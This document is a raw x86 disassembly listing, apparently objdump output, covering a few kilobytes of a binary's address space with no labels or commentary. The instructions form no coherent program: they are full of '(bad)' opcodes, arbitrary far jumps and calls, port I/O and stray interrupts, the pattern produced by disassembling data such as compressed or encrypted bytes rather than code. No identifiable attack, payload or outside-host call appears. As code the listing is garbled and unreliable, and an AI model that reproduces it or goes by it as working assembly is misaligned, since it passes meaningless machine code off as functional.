  4206d2:	add    BYTE PTR [eax-0x638bbd77],dl
  4206d8:	xor    al,0xfd
  4206da:	adc    esp,DWORD PTR [ebx+0x508312c9]
  4206e0:	lahf   
  4206e1:	loope  0x42066b
  4206e3:	iret   
  4206e4:	jns    0x420677
  4206e6:	mov    bh,0x74
  4206e8:	mov    dl,0xf6
  4206ea:	add    edx,DWORD PTR [eax+0xf8c2b1]
  4206f0:	add    BYTE PTR [eax],al
  4206f2:	add    BYTE PTR [eax],al
  4206f4:	or     DWORD PTR [eax+0x50],esi
  4206f7:	jecxz  0x420703
  4206f9:	fild   DWORD PTR fs:[edx]
  4206fc:	nop
  4206fd:	mov    dl,0xc1
  4206ff:	add    eax,DWORD PTR ds:0x5fef2ce5
  420705:	shl    DWORD PTR [edi+0x4f6d0903],0xea
  42070c:	lods   eax,DWORD PTR ds:[esi]
  42070d:	mov    cl,0xf7
  42070f:	mov    BYTE PTR [ebx],dl
  420711:	xlat   BYTE PTR ds:[ebx]
  420712:	imul   eax,DWORD PTR [eax+edx*4],0xffffffb2
  420716:	or     al,0xc4
  420718:	mov    bl,0xb2
  42071a:	test   DWORD PTR [ebx],0xaed02550
  420720:	adc    BYTE PTR [ebx-0xd],dh
  420723:	mov    bl,0xa
  420725:	neg    ebx
  420727:	and    esp,DWORD PTR [eax-0x65]
  42072a:	ret    0x83d3
  42072d:	repnz test DWORD PTR [esi-0x15f029ad],0x8cc50295
  420738:	inc    ebx
  420739:	mov    cl,0xf7
  42073b:	add    ecx,DWORD PTR [ebp-0x380ff43b]
  420741:	mov    dl,0x7a
  420743:	mov    edi,0x551bab3
  420748:	jmp    0xf706:0x245507a8
  42074f:	add    edx,DWORD PTR [eax-0x7d281d65]
  420755:	repnz not DWORD PTR [ebx+0x0]
  42075c:	add    BYTE PTR [esi-0x4],dl
  42075f:	cmp    eax,0xbb31e8b7
  420764:	jg     0x4207ad
  420766:	fwait
  420767:	test   DWORD PTR [ecx-0x69],0x91c0eb2
  42076e:	xchg   DWORD PTR [ecx-0x5cd347b],edx
  420774:	add    eax,0x5b9a04e1
  420779:	in     al,dx
  42077a:	sub    DWORD PTR [ebp+edi*8+0x8],edx
  42077e:	test   ch,dl
  420780:	jmp    0xe950ba2c
  420785:	pop    esp
  420786:	and    eax,0xc0649a03
  42078b:	xchg   esi,eax
  42078c:	fst    st(3)
  42078e:	call   0xe987:0x36942992
  420795:	xchg   ebx,eax
  420796:	mov    dl,0x99
  420798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420799:	out    dx,eax
  42079a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42079b:	dec    esi
  42079c:	int    0x93
  42079e:	mov    dl,0xe
  4207a0:	test   eax,0x879bafdf
  4207a5:	(bad)  
  4207a6:	mov    DWORD PTR [ebx],edx
  4207a8:	jb     0x42074f
  4207aa:	xor    ebp,edx
  4207ac:	int    0x44
  4207ae:	(bad)  [edx]
  4207b0:	jmp    0x5d40ba48
  4207b5:	fadd   DWORD PTR ds:0xea98a992
  4207bb:	fwait
  4207bc:	sub    eax,0xce3ebe68
  4207c1:	add    BYTE PTR [eax],al
  4207c3:	add    BYTE PTR [eax],al
  4207c5:	add    BYTE PTR [ecx-0x73d6fcf6],cl
  4207cb:	xor    eax,0x59f8eece
  4207d0:	xchg   edx,eax
  4207d1:	test   eax,0x2799c959
  4207d6:	push   0x23fdce33
  4207db:	xchg   edi,eax
  4207dc:	add    ecx,DWORD PTR [ecx]
  4207de:	pop    eax
  4207df:	fimul  DWORD PTR [esi]
  4207e1:	ins    BYTE PTR es:[edi],dx
  4207e2:	int3   
  4207e3:	and    eax,0xc65a623f
  4207e8:	inc    ebp
  4207e9:	add    BYTE PTR [edx-0x53afee12],bh
  4207ef:	push   0x31
  4207f1:	sbb    al,0x99
  4207f3:	add    eax,0x76457001
  4207f8:	in     eax,dx
  4207f9:	test   BYTE PTR [ecx-0x4b],bh
  4207fc:	add    eax,0xc020b0c2
  420802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420803:	out    dx,al
  420804:	popa   
  420805:	xor    BYTE PTR [esi+0x7c],bl
  420808:	add    DWORD PTR [ebx-0x2c69a301],ecx
  42080e:	popa   
  42080f:	in     eax,0xe8
  420811:	(bad)  
  420812:	mov    esi,0x35891419
  420817:	sar    dh,cl
  420819:	mov    dh,BYTE PTR [edi]
  42081b:	mov    ds:0xd235893e,al
  420820:	ss call esp
  420823:	mov    ebp,0x2ab94001
  420828:	lods   eax,DWORD PTR ds:[esi]
  420829:	je     0x42082b
  42082b:	add    BYTE PTR [eax],al
  42082d:	add    BYTE PTR [eax],al
  42082f:	ret    0xde18
  420832:	(bad)  
  420833:	in     eax,dx
  420834:	sar    esi,1
  420836:	out    0xe1,eax
  420838:	dec    eax
  420839:	jmp    0x5201:0xbd641eff
  420840:	sbb    ecx,esi
  420842:	pop    ebp
  420843:	jmp    0xfeca:0x4d8b4060
  42084a:	xor    al,BYTE PTR [edx+0x5b]
  42084d:	xchg   esi,eax
  42084e:	icebp  
  42084f:	hlt    
  420850:	adc    ch,BYTE PTR [ebx+0xc]
  420853:	add    BYTE PTR [esp+edx*4+0x4c16655e],ah
  42085a:	or     cl,ch
  42085c:	scas   al,BYTE PTR es:[edi]
  42085d:	mul    DWORD PTR [edx-0x5a]
  420860:	popa   
  420861:	ds push ebx
  420863:	call   0x967:0x9074ea5b
  42086a:	push   ecx
  42086b:	mov    eax,0x47ff3e32
  420870:	xor    dh,ah
  420872:	repz mov ds:0x388912cb,al
  420878:	push   es
  420879:	inc    ecx
  42087a:	jge    0x4208e0
  42087c:	not    al
  42087e:	(bad)  
  42087f:	das    
  420880:	jecxz  0x420839
  420882:	call   FWORD PTR [edi]
  420884:	and    dl,dh
  420886:	and    edi,DWORD PTR [eax+0x6]
  420889:	push   edx
  42088a:	jae    0x420840
  42088c:	pop    esp
  42088d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42088e:	push   esp
  42088f:	pusha  
  420890:	ss inc eax
  420892:	jae    0x420894
  420894:	add    BYTE PTR [eax],al
  420896:	add    BYTE PTR [eax],al
  420898:	mov    ah,0xc3
  42089a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089b:	addr16 jmp 0xef421a7e
  4208a1:	jge    0x4208e8
  4208a3:	adc    DWORD PTR [eax-0x75],edx
  4208a6:	sbb    al,0xc5
  4208a8:	or     ecx,DWORD PTR [edi+0x35]
  4208ab:	sbb    BYTE PTR [esp+edx*4+0x6c],bl
  4208af:	(bad)  
  4208b0:	mov    eax,0xc7ffb7fb
  4208b5:	pop    esp
  4208b6:	push   ecx
  4208b7:	call   0x38402c49
  4208bc:	or     DWORD PTR [ecx+0x12946d6a],ecx
  4208c2:	rol    BYTE PTR [edi],0xe0
  4208c5:	mov    DWORD PTR [esi+0x54f43d5d],ebx
  4208cb:	pop    es
  4208cc:	nop
  4208cd:	fldcw  WORD PTR [ebx-0x12]
  4208d0:	sbb    esi,DWORD PTR [esi-0x4687f7ca]
  4208d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d7:	(bad)  
  4208d8:	jg     0x4208e9
  4208da:	push   ebx
  4208db:	jbe    0x420869
  4208dd:	fwait
  4208de:	push   ecx
  4208df:	call   0x7381c280
  4208e4:	lods   al,BYTE PTR ds:[esi]
  4208e5:	mov    dl,0xe3
  4208e7:	jl     0x420936
  4208e9:	mov    ebp,DWORD PTR [edx]
  4208eb:	push   ecx
  4208ec:	push   esp
  4208ed:	cwde   
  4208ee:	and    eax,0x25b29346
  4208f3:	mov    ecx,0xd362aeb9
  4208f8:	jg     0x4208f1
  4208fa:	pusha  
  4208fb:	ret    0x0
  4208fe:	add    BYTE PTR [eax],al
  420900:	add    bh,dh
  420902:	mov    bl,BYTE PTR [edx+ebp*4]
  420905:	das    
  420906:	cwde   
  420907:	jo     0x4208cb
  420909:	inc    edi
  42090a:	mov    edx,esp
  42090c:	test   eax,0x260981f
  420911:	sub    bl,bh
  420913:	popf   
  420914:	add    al,0x90
  420916:	and    eax,0x1d5507c5
  42091b:	pop    ecx
  42091c:	mov    cl,0x5d
  42091e:	jae    0x4208a8
  420920:	mov    ecx,0x151e2b5c
  420925:	leave  
  420926:	outs   dx,DWORD PTR ds:[esi]
  420927:	hlt    
  420928:	addr16 sbb ebx,esi
  42092b:	idiv   DWORD PTR [edx+0x3c]
  42092e:	stos   BYTE PTR es:[edi],al
  42092f:	pop    esi
  420930:	mov    cl,0x8b
  420932:	outs   dx,DWORD PTR ds:[esi]
  420933:	mov    esp,0xb72c6807
  420938:	add    edi,DWORD PTR [eax]
  42093a:	pop    esi
  42093b:	popa   
  42093c:	les    edi,FWORD PTR [edi+0xff7b426]
  420942:	clc    
  420943:	ret    
  420944:	jp     0x420992
  420946:	shr    BYTE PTR [esi-0x4f],cl
  420949:	jae    0x420974
  42094b:	push   esp
  42094c:	sbb    al,0x40
  42094e:	jo     0x420984
  420950:	hlt    
  420951:	xchg   esp,eax
  420952:	xchg   edi,eax
  420953:	jmp    0xfc7e:0xf7f2a13b
  42095a:	(bad)  
  42095b:	pusha  
  42095c:	cmp    DWORD PTR [esi-0x80],eax
  42095f:	test   DWORD PTR [ebx],0x800e8a90
  420965:	add    BYTE PTR [eax],al
  420967:	add    BYTE PTR [eax],al
  420969:	add    BYTE PTR [edx+0x4860ed97],ah
  42096f:	rcl    DWORD PTR [edi+0x55707c46],cl
  420975:	std    
  420976:	xchg   edx,eax
  420977:	ins    DWORD PTR es:[edi],dx
  420978:	push   ebp
  420979:	leave  
  42097a:	popf   
  42097b:	mov    dl,0xe
  42097d:	jmp    0x278f7846
  420982:	in     eax,dx
  420983:	jno    0x4209c9
  420985:	jb     0x420969
  420987:	pop    DWORD PTR [edx]
  420989:	jmp    0x2626bc21
  42098e:	js     0x42093a
  420990:	paddusw mm1,QWORD PTR [eax+0x6551dc29]
  420997:	push   esp
  420998:	push   cs
  420999:	jmp    0x2b8e772a
  42099e:	(bad)  
  42099f:	mov    dl,0x3f
  4209a1:	cwde   
  4209a2:	cmp    DWORD PTR [edx],ebp
  4209a4:	fist   WORD PTR [esi-0x42686a64]
  4209aa:	mov    bh,0xa6
  4209ac:	aad    0xe7
  4209ae:	outs   dx,DWORD PTR ds:[esi]
  4209af:	sub    DWORD PTR [esi-0x17],ecx
  4209b2:	mov    bl,BYTE PTR [eax]
  4209b4:	sbb    edx,DWORD PTR [edi+0x62440218]
  4209ba:	add    DWORD PTR [edi-0x3d907a6f],ebp
  4209c0:	push   cs
  4209c1:	jb     0x42095a
  4209c3:	pop    ecx
  4209c4:	xchg   ecx,eax
  4209c5:	cmp    DWORD PTR [ebx+0x2cc96396],0xd93323
  4209cf:	add    BYTE PTR [eax],al
  4209d1:	add    BYTE PTR [eax],al
  4209d3:	jl     0x420960
  4209d5:	cdq    
  4209d6:	xor    DWORD PTR [eax+0x73d1dbb1],ecx
  4209dc:	xchg   ebp,eax
  4209dd:	in     eax,dx
  4209de:	(bad)  
  4209df:	or     esi,DWORD PTR [edx+0x711327a9]
  4209e5:	outs   dx,BYTE PTR ds:[esi]
  4209e6:	add    BYTE PTR [edx+0x6372157e],dl
  4209ec:	sbb    ah,BYTE PTR [edx+0x24]
  4209ef:	dec    ebp
  4209f0:	sbb    DWORD PTR [edx],ecx
  4209f2:	mov    ebx,0x1561c9ec
  4209f7:	loop   0x420a52
  4209f9:	adc    edi,eax
  4209fb:	push   0xffffffb2
  4209fd:	xchg   edi,eax
  4209fe:	inc    eax
  4209ff:	cmp    edx,edi
  420a01:	pusha  
  420a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a03:	cmp    DWORD PTR [edx+0x7521cb97],esi
  420a09:	mov    al,0x0
  420a0b:	sub    DWORD PTR [ebp+0x26],ebp
  420a0e:	jle    0x420a45
  420a10:	test   BYTE PTR [eax+0x5b33825d],bh
  420a16:	sbb    al,0xc1
  420a18:	rcl    ebp,1
  420a1a:	push   DWORD PTR [esi-0x41f7a3e7]
  420a20:	ins    BYTE PTR es:[edi],dx
  420a21:	adc    DWORD PTR [edi+ecx*1],ebx
  420a24:	outs   dx,DWORD PTR ds:[esi]
  420a25:	in     eax,dx
  420a26:	out    0x46,eax
  420a28:	dec    ebx
  420a29:	in     eax,dx
  420a2a:	call   DWORD PTR [esi]
  420a2c:	in     eax,dx
  420a2d:	adc    esi,DWORD PTR [eax]
  420a2f:	jae    0x420a9f
  420a31:	in     eax,dx
  420a32:	pop    ebp
  420a33:	add    BYTE PTR [edi-0x32],al
  420a36:	push   ebp
  420a37:	add    BYTE PTR [eax],al
  420a39:	add    BYTE PTR [eax],al
  420a3b:	add    BYTE PTR [edx+0x12],ah
  420a3e:	pop    ebp
  420a3f:	push   esi
  420a40:	add    edx,DWORD PTR [esi-0x4459ff89]
  420a46:	ss sub ebp,0xffffffb1
  420a4a:	xchg   edi,eax
  420a4b:	icebp  
  420a4c:	xchg   esi,eax
  420a4d:	fwait
  420a4e:	gs adc ch,cl
  420a51:	mov    cl,0x91
  420a53:	shr    BYTE PTR ds:0xad608ea1,0xb1
  420a5a:	(bad)  
  420a5b:	pusha  
  420a5c:	mov    eax,ds:0xb900d3b1
  420a61:	sbb    ebp,DWORD PTR [esi]
  420a63:	add    BYTE PTR [eax+0x50310f70],dl
  420a69:	adc    dl,bh
  420a6b:	sti    
  420a6c:	adc    eax,0x52ec54b
  420a71:	lds    edx,FWORD PTR [esi]
  420a73:	mov    eax,ebp
  420a75:	pop    edi
  420a76:	push   0xa144c1fe
  420a7b:	or     edx,DWORD PTR [ebx]
  420a7d:	push   ebx
  420a7e:	pop    esp
  420a7f:	jae    0x420a0d
  420a81:	sti    
  420a82:	adc    ch,cl
  420a84:	scas   al,BYTE PTR es:[edi]
  420a85:	adc    bh,al
  420a87:	sti    
  420a88:	or     eax,0xb12c53d
  420a8d:	fst    QWORD PTR [esi]
  420a8f:	lds    ecx,FWORD PTR [esi-0x6fc09775]
  420a95:	xor    esi,DWORD PTR [ebx-0x5d]
  420a98:	nop
  420a99:	mov    ebp,DWORD PTR [eax-0x33]
  420a9c:	sub    ah,ch
  420a9e:	mov    ch,0xff
  420aa0:	add    BYTE PTR [eax],al
  420aa2:	add    BYTE PTR [eax],al
  420aa4:	add    BYTE PTR [edi],dl
  420aa6:	mov    ecx,0xc7d95d52
  420aab:	nop
  420aac:	jmp    0x420b26
  420aae:	pop    eax
  420aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ab0:	push   ebp
  420ab1:	or     edx,edx
  420ab3:	push   0xa473ac4b
  420ab8:	xchg   BYTE PTR [edi+eiz*4-0x1a],cl
  420abc:	out    0x14,eax
  420abe:	cmp    DWORD PTR [edx],edx
  420ac0:	add    BYTE PTR [ebx],cl
  420ac2:	ret    
  420ac3:	xchg   esi,eax
  420ac4:	jmp    0x8acf:0xfecd0587
  420acb:	nop
  420acc:	js     0x420a62
  420ace:	mov    ch,ah
  420ad0:	xor    DWORD PTR ds:0x1300118a,0x9018352f
  420ada:	pop    eax
  420adb:	push   ecx
  420adc:	mov    ah,BYTE PTR [edi+ebp*2]
  420adf:	std    
  420ae0:	test   al,0xeb
  420ae2:	mov    cl,0x41
  420ae4:	mov    ah,0xe8
  420ae6:	xor    ebp,DWORD PTR es:[eax]
  420ae9:	mov    esp,0x6fb3f808
  420aee:	or     BYTE PTR [eax],cl
  420af0:	add    dl,BYTE PTR [eax-0x3dff44d1]
  420af6:	ja     0x420b58
  420af8:	shl    BYTE PTR [ebx+0x6f377116],0x90
  420aff:	scas   al,BYTE PTR es:[edi]
  420b00:	dec    esi
  420b01:	pop    esp
  420b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b03:	dec    ebp
  420b04:	cmp    DWORD PTR [edx],ecx
  420b06:	pop    ds
  420b07:	aam    0xeb
  420b09:	add    BYTE PTR [eax],al
  420b0b:	add    BYTE PTR [eax],al
  420b0d:	add    BYTE PTR [edx],bl
  420b0f:	fbstp  TBYTE PTR [ebp+0x7b]
  420b12:	lea    ebp,ds:0xb713fdb7
  420b18:	test   BYTE PTR [ebx],0x90
  420b1b:	and    eax,0x257827eb
  420b20:	sti    
  420b21:	fisub  WORD PTR [edi]
  420b23:	xchg   esp,eax
  420b24:	test   DWORD PTR [ebx],0x7b64d70b
  420b2a:	mov    ecx,gs
  420b2c:	ret    
  420b2d:	push   ss
  420b2e:	push   edi
  420b2f:	push   ds
  420b30:	adc    BYTE PTR [ebx+0x165cdb82],bh
  420b36:	std    
  420b37:	mov    ebp,0xb2b7f69f
  420b3c:	pusha  
  420b3d:	push   es
  420b3e:	popf   
  420b3f:	pop    ebx
  420b40:	mul    DWORD PTR [esi]
  420b42:	in     eax,0xb2
  420b44:	test   DWORD PTR [ebx],0xafea9340
  420b4a:	xor    edx,0xfffffff7
  420b4d:	js     0x420aec
  420b4f:	int    0x4
  420b51:	add    al,0x90
  420b53:	mov    dl,0x95
  420b55:	jp     0x420b15
  420b57:	mov    cl,cl
  420b59:	dec    esp
  420b5a:	jge    0x420aef
  420b5c:	ret    0x82bb
  420b5f:	repnz push cs
  420b61:	jmp    0xb82fb6ae
  420b66:	dec    esp
  420b67:	ror    BYTE PTR [edx-0x3],0xd3
  420b6b:	xchg   ebx,eax
  420b6c:	xchg   ecx,eax
  420b6d:	ret    0xd067
  420b70:	in     eax,dx
  420b71:	push   ds
  420b72:	add    BYTE PTR [eax],al
  420b74:	add    BYTE PTR [eax],al
  420b76:	add    ch,dl
  420b78:	pop    edi
  420b79:	xor    ch,BYTE PTR [ecx-0x6d]
  420b7c:	mov    dl,0xe
  420b7e:	(bad)  
  420b7f:	popf   
  420b80:	xchg   ebp,eax
  420b81:	add    eax,DWORD PTR [ebp+0x66]
  420b84:	ror    DWORD PTR [esi],cl
  420b86:	push   0xffffffcf
  420b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b89:	xchg   ebx,eax
  420b8a:	test   eax,0xf799a846
  420b8f:	mov    ebx,0x93e9b198
  420b94:	xor    DWORD PTR [ecx+ebp*8],esi
  420b97:	adc    dh,cl
  420b99:	push   cs
  420b9a:	(bad)  
  420b9b:	rcl    BYTE PTR [ebx],1
  420b9d:	jmp    0xdc7e:0x4b3134ed
  420ba4:	xchg   esi,eax
  420ba5:	fwait
  420ba6:	std    
  420ba7:	outs   dx,DWORD PTR ds:[esi]
  420ba8:	mov    edx,0x166825d5
  420bad:	adc    ebp,ecx
  420baf:	xchg   ebx,eax
  420bb0:	mov    dl,0x99
  420bb2:	not    DWORD PTR [esi]
  420bb4:	and    DWORD PTR [edx-0x4b],0xba1ef586
  420bbb:	js     0x420bd7
  420bbd:	out    dx,eax
  420bbe:	sbb    BYTE PTR [esi+edi*8+0x21],dl
  420bc2:	xor    BYTE PTR [ebx-0x63],cl
  420bc5:	sbb    DWORD PTR [esi],esi
  420bc7:	push   esp
  420bc8:	sub    al,0x51
  420bca:	cmp    DWORD PTR [esi],edx
  420bcc:	push   ebx
  420bcd:	arpl   bx,bp
  420bcf:	mov    dl,0xb1
  420bd1:	cdq    
  420bd2:	dec    DWORD PTR [eax+0x6e]
  420bd5:	xchg   ebx,eax
  420bd6:	push   ss
  420bd7:	fisubr DWORD PTR [ecx+0x2299]
  420bdd:	add    BYTE PTR [eax],al
  420bdf:	add    BYTE PTR [ebx+0x1c],bl
  420be2:	inc    eax
  420be3:	add    BYTE PTR [eax+0x11c091ae],ch
  420be9:	fwait
  420bea:	push   ds
  420beb:	leave  
  420bec:	xor    al,0xef
  420bee:	imul   ebp,DWORD PTR [ecx],0x17
  420bf1:	xor    ch,BYTE PTR [ecx]
  420bf3:	dec    ebx
  420bf4:	cs jg  0x420c09
  420bf7:	inc    ecx
  420bf8:	mov    dl,0xce
  420bfa:	imul   esi,esp,0x6e98a252
  420c00:	mov    ecx,0x1a8b4243
  420c05:	inc    eax
  420c06:	hlt    
  420c07:	std    
  420c08:	jns    0x420bc0
  420c0a:	div    BYTE PTR [ebp-0x7615028e]
  420c10:	mov    bh,0x76
  420c12:	nop
  420c13:	shl    BYTE PTR [ecx+edi*4+0xd],0x45
  420c18:	cmp    DWORD PTR [ecx],edi
  420c1a:	rol    DWORD PTR [esi+ebx*1],cl
  420c1d:	dec    ebx
  420c1e:	xor    DWORD PTR [esp+eiz*4+0x3],edi
  420c22:	xchg   edi,eax
  420c23:	dec    esp
  420c24:	inc    ebp
  420c25:	mov    ds:0x9e557498,al
  420c2a:	xchg   esi,eax
  420c2b:	push   ecx
  420c2c:	sub    eax,0x87085511
  420c31:	adc    DWORD PTR [edx-0x6f],ebx
  420c34:	lods   eax,DWORD PTR ds:[esi]
  420c35:	adc    DWORD PTR ds:0x8e8a4bff,ebx
  420c3b:	clc    
  420c3c:	pop    esi
  420c3d:	bound  edx,QWORD PTR [ecx]
  420c3f:	mov    al,0xe8
  420c41:	lock push ss
  420c43:	lea    eax,[eax]
  420c45:	add    BYTE PTR [eax],al
  420c47:	add    BYTE PTR [eax],al
  420c49:	cmp    eax,0x85e806b2
  420c4e:	cli    
  420c4f:	jmp    0xc5e:0x4af5ebff
  420c56:	popa   
  420c57:	mov    es,esp
  420c59:	add    eax,edi
  420c5b:	adc    DWORD PTR [eax],eax
  420c5d:	and    esi,DWORD PTR [edx-0x7c6f178a]
  420c63:	lods   eax,DWORD PTR ds:[esi]
  420c64:	push   DWORD PTR [edi-0x6ffdfb89]
  420c6a:	add    al,0x54
  420c6c:	xchg   BYTE PTR [ebp-0x21],dl
  420c6f:	xchg   ebp,eax
  420c70:	bound  esp,QWORD PTR [ebx+ebx*4+0x709f604]
  420c77:	and    bh,BYTE PTR [eax]
  420c79:	and    BYTE PTR [edi-0x649f7f18],al
  420c7f:	adc    DWORD PTR [eax],eax
  420c81:	sbb    ecx,ebx
  420c83:	jmp    0x9d9:0x447e586
  420c8a:	(bad)  
  420c8b:	cmp    cl,BYTE PTR [eax+0x476d0d94]
  420c91:	cwde   
  420c92:	adc    ah,BYTE PTR [edi-0x17adea25]
  420c98:	sub    DWORD PTR [ebx+ebx*4],0x11
  420c9c:	add    BYTE PTR [ebx+0x2280e872],cl
  420ca2:	fwait
  420ca3:	adc    DWORD PTR [eax],eax
  420ca5:	or     edx,DWORD PTR [edi-0x5bc4777d]
  420cab:	pop    ecx
  420cac:	pop    edi
  420cad:	add    BYTE PTR [eax],al
  420caf:	add    BYTE PTR [eax],al
  420cb1:	add    BYTE PTR [ebx+0x50320eb3],dl
  420cb7:	adc    ecx,edi
  420cb9:	in     al,0x5c
  420cbb:	xchg   edi,eax
  420cbc:	les    ebp,FWORD PTR [eax-0x79]
  420cbf:	xor    DWORD PTR [ecx-0x7a],edx
  420cc2:	push   ebp
  420cc3:	sti    
  420cc4:	ins    BYTE PTR es:[edi],dx
  420cc5:	dec    ebx
  420cc6:	jnp    0x89c0d35a
  420ccc:	mov    ds:0x6d20bcfc,al
  420cd1:	push   edx
  420cd2:	pushf  
  420cd3:	add    al,0xa7
  420cd5:	pop    es
  420cd6:	clc    
  420cd7:	ds mov ah,0xff
  420cda:	fist   WORD PTR ds:0xb24d7252
  420ce0:	pusha  
  420ce1:	shr    bh,0x3c
  420ce4:	mov    ebx,0x2e377782
  420ce9:	leave  
  420cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ceb:	jecxz  0x420d09
  420ced:	iret   
  420cee:	or     al,0xd2
  420cf0:	pusha  
  420cf1:	mov    al,0x9b
  420cf3:	cmp    eax,0x36affbba
  420cf8:	pop    eax
  420cf9:	add    edx,DWORD PTR [eax+0x6dd03737]
  420cff:	cmp    eax,0xff18643a
  420d04:	je     0x420cba
  420d06:	adc    bh,BYTE PTR [edx+0x45]
  420d09:	lock into 
  420d0b:	pop    DWORD PTR [ebx-0x7f]
  420d0e:	mov    bh,0x3b
  420d10:	or     bh,al
  420d12:	sbb    dh,bh
  420d14:	fistp  WORD PTR [ebx+0x0]
  420d17:	add    BYTE PTR [eax],al
  420d19:	add    BYTE PTR [eax],al
  420d1b:	in     eax,dx
  420d1c:	push   ebx
  420d1d:	test   DWORD PTR [ebx],0x1227313
  420d23:	or     dh,dh
  420d25:	pushf  
  420d26:	dec    edx
  420d27:	setl   BYTE PTR [eax+0x7e]
  420d2b:	rcl    BYTE PTR [edi-0x1f7003d],cl
  420d31:	mov    ebx,0x5ef38bd0
  420d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d37:	inc    edi
  420d38:	cmp    al,0x2
  420d3a:	xor    BYTE PTR [esi],ch
  420d3c:	sbb    esp,DWORD PTR [ebp+0x49]
  420d3f:	sbb    al,0xcc
  420d41:	jle    0x420d12
  420d43:	(bad)  
  420d44:	xor    esp,DWORD PTR [edx-0x9bcf3b9]
  420d4a:	pop    esp
  420d4b:	popf   
  420d4c:	clc    
  420d4d:	jo     0x420d0e
  420d4f:	retf   
  420d50:	cdq    
  420d51:	adc    BYTE PTR [ecx-0xc],cl
  420d54:	(bad)
  420d58:	jae    0x420dba
  420d5a:	fucomip st,st(7)
  420d5c:	xor    ecx,DWORD PTR [esi]
  420d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d5f:	push   edi
  420d60:	mov    fs,WORD PTR [eax]
  420d62:	sub    DWORD PTR [esp+ebx*1],esi
  420d65:	and    ebx,ebp
  420d67:	xchg   ebx,eax
  420d68:	je     0x420d80
  420d6a:	jmp    0x6a9ca97b
  420d6f:	mov    al,0xd3
  420d71:	adc    ch,cl
  420d73:	cld    
  420d74:	in     al,0x44
  420d76:	sahf   
  420d77:	pop    eax
  420d78:	add    esi,DWORD PTR [ebx]
  420d7a:	mov    DWORD PTR [edx],ebp
  420d7c:	sti    
  420d7d:	xor    cl,cl
  420d7f:	add    BYTE PTR [eax],al
  420d81:	add    BYTE PTR [eax],al
  420d83:	add    BYTE PTR [esi],ah
  420d85:	sti    
  420d86:	xor    dl,cl
  420d88:	cmp    eax,DWORD PTR [edx]
  420d8a:	imul   cl
  420d8c:	xchg   ebx,eax
  420d8d:	ss into 
  420d8f:	out    dx,al
  420d90:	pop    es
  420d91:	mov    al,ds:0x3b93e90e
  420d96:	pop    edx
  420d97:	add    eax,0xd1319780
  420d9c:	xchg   ebx,eax
  420d9d:	mov    dl,0x93
  420d9f:	test   eax,0xe9cd3468
  420da4:	xchg   ebx,eax
  420da5:	mov    dl,0x20
  420da7:	xchg   edx,eax
  420da8:	or     al,0x9b
  420daa:	push   es
  420dab:	je     0x420dbc
  420dad:	shl    DWORD PTR [esi],cl
  420daf:	cmp    DWORD PTR [edi-0x2426cd05],edi
  420db5:	pop    ss
  420db6:	imul   ecx
  420db8:	xchg   ebx,eax
  420db9:	xor    ecx,esi
  420dbb:	imul   BYTE PTR [esi-0x6c16f1a0]
  420dc1:	cmp    DWORD PTR [edx-0x33],ebx
  420dc4:	mov    edi,DWORD PTR [ecx]
  420dc6:	push   edx
  420dc7:	lds    ecx,FWORD PTR [edi+0x58e9d00f]
  420dcd:	mov    gs,ebp
  420dcf:	push   0xffffffc3
  420dd1:	mov    ss,WORD PTR [ebx-0x79ca07d7]
  420dd7:	jmp    0xa2c06f
  420ddc:	in     eax,0x33
  420dde:	in     al,0x0
  420de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420de1:	sbb    ch,dh
  420de3:	push   cs
  420de4:	outs   dx,BYTE PTR ds:[esi]
  420de5:	or     eax,0xffee
  420dea:	add    BYTE PTR [eax],al
  420dec:	add    cl,ch
  420dee:	inc    ebx
  420def:	cwde   
  420df0:	dec    esp
  420df1:	fstp   QWORD PTR [edx-0x4c5fe70b]
  420df7:	push   cs
  420df8:	test   DWORD PTR [ecx-0x80],ebp
  420dfb:	imul   ecx,DWORD PTR [ebx-0x17d950eb],0xffed5431
  420e05:	and    ah,bl
  420e07:	nop
  420e08:	neg    BYTE PTR ds:0xcd7c9693
  420e0e:	mov    edx,0x7304ee97
  420e13:	xor    DWORD PTR [eax-0x37],esp
  420e16:	aas    
  420e17:	in     eax,dx
  420e18:	punpckhwd mm6,QWORD PTR [edx-0x320d06d9]
  420e1f:	sbb    al,BYTE PTR [edi+0x38]
  420e22:	inc    edi
  420e23:	inc    eax
  420e24:	lea    esi,[ebp-0x5117d12e]
  420e2a:	out    dx,eax
  420e2b:	in     eax,dx
  420e2c:	push   edx
  420e2e:	into   
  420e2f:	nop
  420e30:	leave  
  420e31:	lods   al,BYTE PTR ds:[esi]
  420e32:	call   0xe80e:0x924d4496
  420e39:	push   edx
  420e3a:	cli    
  420e3b:	nop
  420e3c:	rol    BYTE PTR [edi+0x2cff91b2],0xc8
  420e43:	xchg   esi,eax
  420e44:	lds    eax,FWORD PTR [edx-0x30]
  420e47:	xchg   esp,eax
  420e48:	inc    esp
  420e49:	dec    ebp
  420e4a:	call   0x4497:0xb312c91e
  420e51:	add    BYTE PTR [eax],al
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    BYTE PTR [ebp-0x23366f62],bl
  420e5b:	mov    dl,BYTE PTR [esi-0x9406fb4]
  420e61:	dec    edi
  420e62:	pop    esi
  420e63:	repz loope 0x420e63
  420e66:	out    dx,eax
  420e67:	hlt    
  420e68:	push   0x4ade1bd7
  420e6d:	inc    esi
  420e6e:	xor    DWORD PTR [ecx+edx*1-0x2148bb75],ebx
  420e75:	out    0xe0,eax
  420e77:	mov    ds:0xf10c0012,eax
  420e7c:	mov    edi,0xd580d12
  420e81:	adc    al,0xa8
  420e83:	and    eax,0x1eafff4c
  420e88:	push   ebx
  420e89:	or     al,0xc
  420e8b:	ja     0x420ee1
  420e8d:	cld    
